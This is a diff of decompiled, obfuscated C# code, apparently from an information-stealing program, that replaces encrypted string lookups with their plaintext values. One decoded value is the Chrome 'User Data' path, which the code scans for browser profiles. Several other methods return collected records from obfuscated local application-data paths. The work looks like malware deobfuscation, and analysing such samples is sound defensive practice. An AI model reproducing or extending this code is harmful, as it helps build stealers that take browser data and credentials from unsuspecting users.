@@ -28,7 +28,7 @@ internal sealed class AEM
 					while (!streamReader.EndOfStream)
 					{
 						string text = streamReader.ReadLine();
-						if (text.StartsWith(O.I("HSAFtT9tU/CJXqTiQiKtDw==")) && text.EndsWith(O.I("Z4jD7DD9AWsia64BAagzdA==")))
+						if (text.StartsWith("[") && text.EndsWith("]"))
 						{
 							key = text.Substring(1, text.Length - 2);
 							if (!ContainsKey(key))
@@ -36,7 +36,7 @@ internal sealed class AEM
 								Add(key, new Dictionary<string, string>());
 							}
 						}
-						else if (!text.StartsWith(O.I("09n8N3Pl6ckrpjlAg7i+hA==")) && text.Contains(O.I("gc1Gc6FF0ohA75tz34XTMw==")))
+						else if (!text.StartsWith(";") && text.Contains("="))
 						{
 							int num = text.IndexOf('=');
 							this[key][text.Substring(0, num)] = text.Substring(num + 1, text.Length - num - 1);
@@ -106,14 +106,11 @@ internal sealed class AEM
 
 	internal static List<JK> JHE()
 	{
-		//Discarded unreachable code: IL_00c6, IL_00d9
-		//IL_00d0: Expected O, but got I4
-		//IL_00d1: Expected O, but got I4
 		List<string> list = new List<string>();
 		List<JK> list2 = new List<JK>();
 		try
 		{
-			string[] directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + O.I("swsssXJQPwpBZ7ZjcY9lTJYx6laKzsGV2anwwRZKyVo="));
+			string[] directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\");
 			foreach (string text in directories)
 			{
 				if ((text.Contains(O.I("um7v20OaGIK8dIQkFUklcA==")) | text.EndsWith(O.I("oZnP76oC1ZS4jaPK0QwXwA=="))) && File.Exists(text + O.I("jw+ZQahqrPV+Nu07/71YHA==")))
@@ -300,9 +297,6 @@ internal sealed class AEM
 
 	internal static List<JK> HAF()
 	{
-		//Discarded unreachable code: IL_0193, IL_01a6
-		//IL_019d: Expected O, but got I4
-		//IL_019e: Expected O, but got I4
 		List<JK> list = new List<JK>();
 		string empty = string.Empty;
 		string empty2 = string.Empty;
@@ -353,9 +347,6 @@ internal sealed class AEM
 
 	internal static List<JK> LA()
 	{
-		//Discarded unreachable code: IL_0048, IL_005b
-		//IL_0052: Expected O, but got I4
-		//IL_0053: Expected O, but got I4
 		try
 		{
 			return SRT.VQ(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), O.I("p0PDzqn/xONUMUGbTdKlaBl8XgJAq1rWzoU4X7GuEl+sKjK9girJNQi+hVX/H+8Z")), O.I("qlBjkGvEULl8lINzUClG0Q=="), O.I("a8GP8b8cAjyx6syZvoL+Pg=="));
@@ -947,9 +938,6 @@ internal sealed class AEM
 
 	internal static List<JK> KJ()
 	{
-		//Discarded unreachable code: IL_0176, IL_0189
-		//IL_0180: Expected O, but got I4
-		//IL_0181: Expected O, but got I4
 		List<JK> list = new List<JK>();
 		try
 		{
